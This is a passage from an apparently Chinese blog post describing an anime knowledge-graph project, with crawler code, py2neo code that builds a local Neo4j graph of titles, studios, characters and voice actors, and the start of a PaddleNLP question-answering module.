class="built_in">str</span>(role_name_list[i])[<span class="number">1</span>:-<span class="number">1</span>].replace(<span class="string">&#x27;\&#x27;&#x27;</span>, <span class="string">&#x27;&#x27;</span>).replace(<span class="string">&#x27;,&#x27;</span>, <span class="string">&#x27;&#x27;</span>) + <span class="string">&quot;\n&quot;</span>)</span><br><span class="line">            self.role_img_file.write(<span class="built_in">str</span>(role_img_list[i])[<span class="number">1</span>:-<span class="number">1</span>].replace(<span class="string">&#x27;\&#x27;&#x27;</span>, <span class="string">&#x27;&#x27;</span>).replace(<span class="string">&#x27;,&#x27;</span>, <span class="string">&#x27;&#x27;</span>) + <span class="string">&quot;\n&quot;</span>)</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">run</span>(<span class="params">self</span>):</span></span><br><span class="line">        self.name_file = <span class="built_in">open</span>(<span class="string">&#x27;data/name.txt&#x27;</span>, <span class="string">&#x27;w&#x27;</span>, encoding=<span class="string">&#x27;utf8&#x27;</span>)</span><br><span class="line">        self.author_file = <span class="built_in">open</span>(<span class="string">&#x27;data/author.txt&#x27;</span>, <span class="string">&#x27;w&#x27;</span>, encoding=<span class="string">&#x27;utf8&#x27;</span>)</span><br><span class="line">        self.role_name_file = <span class="built_in">open</span>(<span class="string">&#x27;data/role_name.txt&#x27;</span>, <span class="string">&#x27;w&#x27;</span>, encoding=<span class="string">&#x27;utf8&#x27;</span>)</span><br><span class="line">        self.role_img_file = <span class="built_in">open</span>(<span class="string">&#x27;data/role_img.txt&#x27;</span>, <span class="string">&#x27;w&#x27;</span>, encoding=<span class="string">&#x27;utf8&#x27;</span>)</span><br><span class="line">        self.platform_file = <span class="built_in">open</span>(<span class="string">&#x27;data/platform.txt&#x27;</span>, <span class="string">&#x27;w&#x27;</span>, encoding=<span class="string">&#x27;utf8&#x27;</span>)</span><br><span class="line">        self.seiyuu_file = <span class="built_in">open</span>(<span class="string">&#x27;data/seiyuu.txt&#x27;</span>, <span class="string">&#x27;w&#x27;</span>, encoding=<span class="string">&#x27;utf8&#x27;</span>)</span><br><span class="line">        self.classify_file = <span class="built_in">open</span>(<span class="string">&#x27;data/classify.txt&#x27;</span>, <span class="string">&#x27;w&#x27;</span>, encoding=<span class="string">&#x27;utf8&#x27;</span>)</span><br><span class="line"></span><br><span class="line">        <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">30</span>):</span><br><span class="line">            self.base_url = self.target_url + <span class="built_in">str</span>(i+<span class="number">1</span>) + <span class="string">&quot;.html&quot;</span></span><br><span class="line">            <span class="built_in">print</span>(<span class="string">&quot;Now is: &quot;</span> + self.base_url)</span><br><span class="line">            self.create_list()</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">test</span>(<span class="params">self</span>):</span></span><br><span class="line">        res = requests.get(self.target_url, headers)</span><br><span class="line">        <span class="built_in">print</span>(res.encoding)</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&#x27;__main__&#x27;</span>:</span><br><span class="line">    cra = Crawler()</span><br><span class="line">    cra.run()</span><br></pre></td></tr></table></figure>
<p>构建知识图谱的代码：</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># -*- coding: utf-8 -*-#</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">from</span> py2neo <span class="keyword">import</span> Graph,Node,Relationship</span><br><span class="line"><span class="keyword">import</span> os</span><br><span class="line"></span><br><span class="line">classification = [<span class="string">&#x27;番剧名称&#x27;</span>,<span class="string">&#x27;番剧类型&#x27;</span>,<span class="string">&#x27;角色列表&#x27;</span>,<span class="string">&#x27;声优列表&#x27;</span>,<span class="string">&#x27;播放平台&#x27;</span>,<span class="string">&#x27;制作公司&#x27;</span>]</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">KG</span>:</span></span><br><span class="line">    name_file = <span class="built_in">open</span>(<span class="string">&#x27;data/name.txt&#x27;</span>, <span class="string">&#x27;r&#x27;</span>, encoding=<span class="string">&#x27;utf8&#x27;</span>)</span><br><span class="line">    platform_file = <span class="built_in">open</span>(<span class="string">&#x27;data/platform.txt&#x27;</span>, <span class="string">&#x27;r&#x27;</span>, encoding=<span class="string">&#x27;utf8&#x27;</span>)</span><br><span class="line">    author_file = <span class="built_in">open</span>(<span class="string">&#x27;data/author.txt&#x27;</span>, <span class="string">&#x27;r&#x27;</span>, encoding=<span class="string">&#x27;utf8&#x27;</span>)</span><br><span class="line">    role_img_file = <span class="built_in">open</span>(<span class="string">&#x27;data/role_img.txt&#x27;</span>, <span class="string">&#x27;r&#x27;</span>, encoding=<span class="string">&#x27;utf8&#x27;</span>)</span><br><span class="line">    role_name_file = <span class="built_in">open</span>(<span class="string">&#x27;data/role_name.txt&#x27;</span>, <span class="string">&#x27;r&#x27;</span>, encoding=<span class="string">&#x27;utf8&#x27;</span>)</span><br><span class="line">    seiyuu_file = <span class="built_in">open</span>(<span class="string">&#x27;data/seiyuu.txt&#x27;</span>, <span class="string">&#x27;r&#x27;</span>, encoding=<span class="string">&#x27;utf8&#x27;</span>)</span><br><span class="line">    classify_file = <span class="built_in">open</span>(<span class="string">&#x27;data/classify.txt&#x27;</span>, <span class="string">&#x27;r&#x27;</span>, encoding=<span class="string">&#x27;utf8&#x27;</span>)</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">createEntity</span>(<span class="params">self,graph</span>):</span></span><br><span class="line">        cql = <span class="string">&#x27;&#x27;&#x27;CREATE (n:番剧数据库&#123;id:&#x27;0&#x27;, name:&#x27;番剧数据库&#x27;&#125;) RETURN n&#x27;&#x27;&#x27;</span></span><br><span class="line">        graph.run(cql)</span><br><span class="line"></span><br><span class="line">        <span class="keyword">for</span> i, c <span class="keyword">in</span> <span class="built_in">enumerate</span>(classification):</span><br><span class="line">            cql = <span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="string">                MERGE (a:番剧数据库&#123;id:&#x27;%d&#x27;, name:&#x27;%s&#x27;&#125;)</span></span><br><span class="line"><span class="string">                MERGE (b &#123;name: &#x27;番剧数据库&#x27;&#125;) </span></span><br><span class="line"><span class="string">                MERGE (b)-[:划分]-&gt;(a)</span></span><br><span class="line"><span class="string">                &#x27;&#x27;&#x27;</span> % (i+<span class="number">1</span>, c)</span><br><span class="line">            graph.run(cql)</span><br><span class="line"></span><br><span class="line">        name_list = self.name_file.readlines()</span><br><span class="line">        author_list = self.author_file.readlines()</span><br><span class="line">        platform_list = self.platform_file.readlines()</span><br><span class="line"></span><br><span class="line">        <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="built_in">len</span>(name_list)):</span><br><span class="line">            cql = <span class="string">&quot;&quot;&quot;</span></span><br><span class="line"><span class="string">                MERGE (:番剧名称&#123;id:&#x27;%d&#x27;,名称:&quot;%s&quot;&#125;)</span></span><br><span class="line"><span class="string">                &quot;&quot;&quot;</span> % (i, name_list[i].replace(<span class="string">&#x27;\n&#x27;</span>,<span class="string">&#x27;&#x27;</span>))</span><br><span class="line">            graph.run(cql)</span><br><span class="line"></span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&quot;step 1 down&quot;</span>)</span><br><span class="line"></span><br><span class="line">        author_tmp_list = []</span><br><span class="line">        platform_tmp_list = []</span><br><span class="line">        <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="built_in">len</span>(name_list)):</span><br><span class="line">            <span class="keyword">if</span> author_list[i] <span class="keyword">not</span> <span class="keyword">in</span> author_tmp_list:</span><br><span class="line">                author_tmp_list.append(author_list[i])</span><br><span class="line">                cql = <span class="string">&quot;&quot;&quot;</span></span><br><span class="line"><span class="string">                    MERGE (:制作公司&#123;id:&#x27;%d&#x27;, 名称:&quot;%s&quot;&#125;)</span></span><br><span class="line"><span class="string">                    &quot;&quot;&quot;</span> % (i, author_list[i].replace(<span class="string">&#x27;\n&#x27;</span>,<span class="string">&#x27;&#x27;</span>))</span><br><span class="line">                graph.run(cql)</span><br><span class="line">            <span class="keyword">if</span> platform_list[i] <span class="keyword">not</span> <span class="keyword">in</span> platform_tmp_list:</span><br><span class="line">                platform_tmp_list.append(platform_list[i])</span><br><span class="line">                cql = <span class="string">&quot;&quot;&quot;</span></span><br><span class="line"><span class="string">                    MERGE (:播放平台&#123;id:&#x27;%d&#x27;, 名称:&quot;%s&quot;&#125;)</span></span><br><span class="line"><span class="string">                    &quot;&quot;&quot;</span> % (i, platform_list[i].replace(<span class="string">&#x27;\n&#x27;</span>, <span class="string">&#x27;&#x27;</span>))</span><br><span class="line">                graph.run(cql)</span><br><span class="line"></span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&quot;step 2 down&quot;</span>)</span><br><span class="line"></span><br><span class="line">        classify_tmp_list = []</span><br><span class="line">        seiyuu_tmp_list = []</span><br><span class="line">        <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="built_in">len</span>(name_list)):</span><br><span class="line">            classify_list = self.classify_file.readline().split(<span class="string">&#x27; &#x27;</span>)</span><br><span class="line">            seiyuu_list = self.seiyuu_file.readline().split(<span class="string">&#x27; &#x27;</span>)</span><br><span class="line">            role_name_list = self.role_name_file.readline().split(<span class="string">&#x27; &#x27;</span>)</span><br><span class="line">            role_img_list = self.role_img_file.readline().split(<span class="string">&#x27; &#x27;</span>)</span><br><span class="line">            <span class="keyword">for</span> j <span class="keyword">in</span> <span class="built_in">range</span>(<span class="built_in">len</span>(classify_list)):</span><br><span class="line">                <span class="keyword">if</span> classify_list[j] <span class="keyword">not</span> <span class="keyword">in</span> classify_tmp_list:</span><br><span class="line">                    classify_tmp_list.append(classify_list[j])</span><br><span class="line">                    cql = <span class="string">&quot;&quot;&quot;</span></span><br><span class="line"><span class="string">                        MERGE (:番剧类型&#123;类型:&#x27;%s&#x27;&#125;)</span></span><br><span class="line"><span class="string">                        &quot;&quot;&quot;</span> % (classify_list[j].replace(<span class="string">&#x27;\n&#x27;</span>,<span class="string">&#x27;&#x27;</span>))</span><br><span class="line">                    graph.run(cql)</span><br><span class="line">            <span class="keyword">for</span> j <span class="keyword">in</span> <span class="built_in">range</span>(<span class="built_in">len</span>(seiyuu_list)):</span><br><span class="line">                <span class="keyword">if</span> seiyuu_list[j] <span class="keyword">not</span> <span class="keyword">in</span> seiyuu_tmp_list:</span><br><span class="line">                    seiyuu_tmp_list.append(seiyuu_list[j])</span><br><span class="line">                    cql = <span class="string">&quot;&quot;&quot;</span></span><br><span class="line"><span class="string">                        MERGE (:声优列表&#123;名称:&#x27;%s&#x27;&#125;)</span></span><br><span class="line"><span class="string">                        &quot;&quot;&quot;</span> % (seiyuu_list[j].replace(<span class="string">&#x27;\n&#x27;</span>,<span class="string">&#x27;&#x27;</span>))</span><br><span class="line">                    graph.run(cql)</span><br><span class="line">            <span class="keyword">for</span> j <span class="keyword">in</span> <span class="built_in">range</span>(<span class="built_in">len</span>(role_name_list)):</span><br><span class="line">                <span class="keyword">if</span> (<span class="built_in">len</span>(role_name_list)!=<span class="built_in">len</span>(role_img_list)):</span><br><span class="line">                    <span class="built_in">print</span>(role_name_list[j])</span><br><span class="line">                    <span class="built_in">print</span>(role_img_list[j])</span><br><span class="line">                cql = <span class="string">&quot;&quot;&quot;</span></span><br><span class="line"><span class="string">                    MERGE (:角色列表&#123;名称:&#x27;%s&#x27;,图片:&#x27;%s&#x27;&#125;)</span></span><br><span class="line"><span class="string">                    &quot;&quot;&quot;</span> % (role_name_list[j].replace(<span class="string">&#x27;\n&#x27;</span>,<span class="string">&#x27;&#x27;</span>),role_img_list[j].replace(<span class="string">&#x27;\n&#x27;</span>,<span class="string">&#x27;&#x27;</span>))</span><br><span class="line">                graph.run(cql)</span><br><span class="line"></span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&quot;step 3 down&quot;</span>)</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">createreRationship</span>(<span class="params">self,graph</span>):</span></span><br><span class="line">        self.name_file.seek(<span class="number">0</span>)</span><br><span class="line">        self.seiyuu_file.seek(<span class="number">0</span>)</span><br><span class="line">        self.platform_file.seek(<span class="number">0</span>)</span><br><span class="line">        self.role_name_file.seek(<span class="number">0</span>)</span><br><span class="line">        self.role_img_file.seek(<span class="number">0</span>)</span><br><span class="line">        self.author_file.seek(<span class="number">0</span>)</span><br><span class="line">        self.classify_file.seek(<span class="number">0</span>)</span><br><span class="line"></span><br><span class="line">        name_list = self.name_file.readlines()</span><br><span class="line">        author_list = self.author_file.readlines()</span><br><span class="line">        platform_list = self.platform_file.readlines()</span><br><span class="line"></span><br><span class="line">        <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="built_in">len</span>(name_list)):</span><br><span class="line">            classify_list = self.classify_file.readline().split(<span class="string">&#x27; &#x27;</span>)</span><br><span class="line">            role_name_list = self.role_name_file.readline().split(<span class="string">&#x27; &#x27;</span>)</span><br><span class="line">            role_img_list = self.role_img_file.readline().split(<span class="string">&#x27; &#x27;</span>)</span><br><span class="line">            seiyuu_list = self.seiyuu_file.readline().split(<span class="string">&#x27; &#x27;</span>)</span><br><span class="line"></span><br><span class="line">            <span class="keyword">for</span> j <span class="keyword">in</span> <span class="built_in">range</span>(<span class="built_in">len</span>(classify_list)-<span class="number">1</span>):</span><br><span class="line">                cql = <span class="string">&quot;&quot;&quot;</span></span><br><span class="line"><span class="string">                    MATCH (a:番剧名称&#123;id:&#x27;%d&#x27;, 名称:&quot;%s&quot;&#125;),</span></span><br><span class="line"><span class="string">                          (b:番剧类型&#123;类型:&#x27;%s&#x27;&#125;)</span></span><br><span class="line"><span class="string">                    MERGE (b)-[:类型]-&gt;(a)</span></span><br><span class="line"><span class="string">                &quot;&quot;&quot;</span> % (i,name_list[i].replace(<span class="string">&#x27;\n&#x27;</span>,<span class="string">&#x27;&#x27;</span>),</span><br><span class="line">                       classify_list[j].replace(<span class="string">&#x27;\n&#x27;</span>,<span class="string">&#x27;&#x27;</span>))</span><br><span class="line">                graph.run(cql)</span><br><span class="line"></span><br><span class="line">            <span class="keyword">for</span> j <span class="keyword">in</span> <span class="built_in">range</span>(<span class="built_in">len</span>(role_name_list)):</span><br><span class="line">                cql = <span class="string">&quot;&quot;&quot;</span></span><br><span class="line"><span class="string">                    MATCH (a:番剧名称&#123;id:&#x27;%d&#x27;, 名称:&quot;%s&quot;&#125;),</span></span><br><span class="line"><span class="string">                          (b:角色列表&#123;名称:&#x27;%s&#x27;,图片:&#x27;%s&#x27;&#125;)</span></span><br><span class="line"><span class="string">                    MERGE (b)-[:属于]-&gt;(a)</span></span><br><span class="line"><span class="string">                &quot;&quot;&quot;</span> % (i,name_list[i].replace(<span class="string">&#x27;\n&#x27;</span>,<span class="string">&#x27;&#x27;</span>),</span><br><span class="line">                       role_name_list[j].replace(<span class="string">&#x27;\n&#x27;</span>,<span class="string">&#x27;&#x27;</span>),</span><br><span class="line">                       role_img_list[j].replace(<span class="string">&#x27;\n&#x27;</span>,<span class="string">&#x27;&#x27;</span>))</span><br><span class="line">                graph.run(cql)</span><br><span class="line"></span><br><span class="line">                cql = <span class="string">&quot;&quot;&quot;</span></span><br><span class="line"><span class="string">                    MATCH (a:声优列表&#123;名称:&quot;%s&quot;&#125;),</span></span><br><span class="line"><span class="string">                          (b:角色列表&#123;名称:&#x27;%s&#x27;,图片:&#x27;%s&#x27;&#125;)</span></span><br><span class="line"><span class="string">                    MERGE (a)-[:配音]-&gt;(b)</span></span><br><span class="line"><span class="string">                &quot;&quot;&quot;</span> % (seiyuu_list[j].replace(<span class="string">&#x27;\n&#x27;</span>, <span class="string">&#x27;&#x27;</span>),</span><br><span class="line">                       role_name_list[j].replace(<span class="string">&#x27;\n&#x27;</span>, <span class="string">&#x27;&#x27;</span>),</span><br><span class="line">                       role_img_list[j].replace(<span class="string">&#x27;\n&#x27;</span>, <span class="string">&#x27;&#x27;</span>))</span><br><span class="line">                graph.run(cql)</span><br><span class="line"></span><br><span class="line">            cql = <span class="string">&quot;&quot;&quot;</span></span><br><span class="line"><span class="string">                MATCH (a:番剧名称&#123;id:&#x27;%d&#x27;, 名称:&quot;%s&quot;&#125;),</span></span><br><span class="line"><span class="string">                      (b:制作公司&#123;名称:&quot;%s&quot;&#125;)</span></span><br><span class="line"><span class="string">                MERGE (b)-[:制作]-&gt;(a)</span></span><br><span class="line"><span class="string">            &quot;&quot;&quot;</span> % (i,name_list[i].replace(<span class="string">&#x27;\n&#x27;</span>,<span class="string">&#x27;&#x27;</span>),</span><br><span class="line">                   author_list[i].replace(<span class="string">&#x27;\n&#x27;</span>,<span class="string">&#x27;&#x27;</span>))</span><br><span class="line">            graph.run(cql)</span><br><span class="line"></span><br><span class="line">            cql = <span class="string">&quot;&quot;&quot;</span></span><br><span class="line"><span class="string">                MATCH (a:番剧名称&#123;id:&#x27;%d&#x27;, 名称:&quot;%s&quot;&#125;),</span></span><br><span class="line"><span class="string">                      (b:播放平台&#123;名称:&quot;%s&quot;&#125;)</span></span><br><span class="line"><span class="string">                MERGE (b)-[:播放]-&gt;(a)</span></span><br><span class="line"><span class="string">            &quot;&quot;&quot;</span> % (i,name_list[i].replace(<span class="string">&#x27;\n&#x27;</span>,<span class="string">&#x27;&#x27;</span>),</span><br><span class="line">                   platform_list[i].replace(<span class="string">&#x27;\n&#x27;</span>,<span class="string">&#x27;&#x27;</span>))</span><br><span class="line">            graph.run(cql)</span><br><span class="line"></span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&quot;step 4 down&quot;</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&#x27;__main__&#x27;</span>:</span><br><span class="line">    test_graph = Graph(<span class="string">&quot;http://127.0.0.1:7474/browser/&quot;</span>, auth=(<span class="string">&quot;neo4j&quot;</span>, <span class="string">&quot;123456789&quot;</span>))</span><br><span class="line">    test_graph.run(<span class="string">&#x27;match(n) detach delete n&#x27;</span>)</span><br><span class="line">    kg = KG()</span><br><span class="line">    kg.createEntity(test_graph)</span><br><span class="line">    kg.createreRationship(test_graph)</span><br></pre></td></tr></table></figure>
<p>另外对网页后端逻辑进行了修改，使其可以分类查找实体：</p>
<img src="/2023/03/12/%E7%9F%A5%E8%AF%86%E5%9B%BE%E8%B0%B1%E5%AE%9E%E8%B7%B5%E9%A1%B9%E7%9B%AE%E4%B8%89/1678615439732.png" class width="1678615439732"> 
<h2 id="基于-PaddleNLP-的知识问答"><a href="#基于-PaddleNLP-的知识问答" class="headerlink" title="基于 PaddleNLP 的知识问答"></a>基于 PaddleNLP 的知识问答</h2><p>这次选择做番剧的知识图谱，就是为了尝试一下知识问答</p>
<p>该图谱的关系如下：</p>
<ul>
<li>[制作公司] -&gt; [制作] -&gt; [番剧名称]</li>
<li>[角色列表] -&gt; [属于] -&gt; [番剧名称]</li>
<li>[播放平台] -&gt; [播放] -&gt; [番剧名称]</li>
<li>[番剧类型] -&gt; [类型] -&gt; [番剧名称]</li>
<li>[声优列表] -&gt; [类型] -&gt; [角色列表]</li>
</ul>
<p><strong>PaddleNLP</strong> 提供开箱即用的产业级 <strong>NLP</strong> 预置任务能力，无需训练</p>
<ul>
<li>一键预测最全的中文任务：覆盖 <strong>自然语言理解</strong> 与 <strong>自然语言生成</strong> 两大核心应用</li>
<li>极致的产业级效果：在多个中文场景上提供产业级的 <strong>精度</strong> 与 <strong>预测性能</strong></li>
</ul>
<p>我的想法比较简单：</p>
<ul>
<li>用 PaddleNLP 对输入数据进行 “词性分析”，记录第一个名词</li>
<li>对该名词进行模糊匹配，判断该名词属于的实体类型，并获取名词后面的实体名称（记为主实体）</li>
<li>依据主实体类型调用不同的处理函数，然后在对应函数中查找目标的实体类型（记为次实体）</li>
<li>在一直主实体的情况下，次实体类型的判断会得到优化，例如：<ul>
<li>主实体为 [番剧名称]，那么次实体就只可能为 [番剧类型]，[角色列表]，[制作公司]，[播放平台] </li>
<li>主实体为 [角色列表]，那么次实体就只可能为 [声优列表]，[番剧名称]</li>
</ul>
</li>
<li>由于本知识图谱的关系比较单一（两个实体之间最多只会存在一种关系），因此我们不需要去分析实体之间的关系，而是通过主实体和次实体来推断出关系类型</li>
</ul>
<p>效果如下图：</p>
<img src="/2023/03/12/%E7%9F%A5%E8%AF%86%E5%9B%BE%E8%B0%B1%E5%AE%9E%E8%B7%B5%E9%A1%B9%E7%9B%AE%E4%B8%89/1678608243118-1678615461425.png" class width="1678608243118"> 
<img src="/2023/03/12/%E7%9F%A5%E8%AF%86%E5%9B%BE%E8%B0%B1%E5%AE%9E%E8%B7%B5%E9%A1%B9%E7%9B%AE%E4%B8%89/1678608300113-1678615461426.png" class width="1678608300113"> 
<img src="/2023/03/12/%E7%9F%A5%E8%AF%86%E5%9B%BE%E8%B0%B1%E5%AE%9E%E8%B7%B5%E9%A1%B9%E7%9B%AE%E4%B8%89/1678615361466.png" class width="1678615361466"> 
<p>实现该功能的核心代码如下：</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> paddlenlp <span class="keyword">import</span> Taskflow</span><br><span class="line"><span class="keyword">from</span> fuzzywuzzy <span class="keyword">import</span> process</span><br><span class="line"><span class="keyword">from</span> fuzzywuzzy <span class="keyword">import</span> fuzz</span><br><span class="line"><span class="keyword">from</span> . models <span class="keyword">import</span> Neo4j</span><br><span class="line"><span class="keyword">import</span> re</span><br><span class="line"></span><br><span class="line">choices_anime = [<span class="string">&quot;动画&quot;</span>, <span class="string">&quot;动画片&quot;</span>, <span class="string">&quot;番剧&quot;</span>, <span class="string">&quot;动漫&quot;</span>,<span class="string">&quot;作品&quot;</span>]</span><br><span class="line">choices_role = [<span class="string">&quot;角色&quot;</span>, <span class="string">&quot;人物&quot;</span>]</span><br><span class="line">choices_seiyuu = [<span class="string">&quot;声优&quot;</span>, <span class="string">&quot;配音&quot;</span>]</span><br><span class="line">choices_author = [<span class="string">&quot;公司&quot;</span>, <span class="string">&quot;团队&quot;</span>, <span class="string">&quot;作者&quot;</span>]</span><br><span class="line">choices_classify = [<span class="string">&quot;类型&quot;</span>, <span class="string">&quot;类别&quot;</span>, <span class="string">&quot;分类&quot;</span>]</span><br><span class="line">choices_platform = [<span class="string">&quot;平台&quot;</span>, <span class="string">&quot;播放平台&quot;</span>]</span><br><span class="line"></span><br><span class="line">choices_anime_do = [<span class="string">&quot;有&quot;</span>,<span class="string">&quot;是&quot;</span>,<span class="string">&quot;的&quot;</span>]</span><br><span class="line">choices_seiyuu_do = [<span class="string">&quot;给&quot;</span>, <span class="string">&quot;配&quot;</span>, <span class="string">&quot;配音&quot;</span>]</span><br><span class="line">choices_author_do = [<span 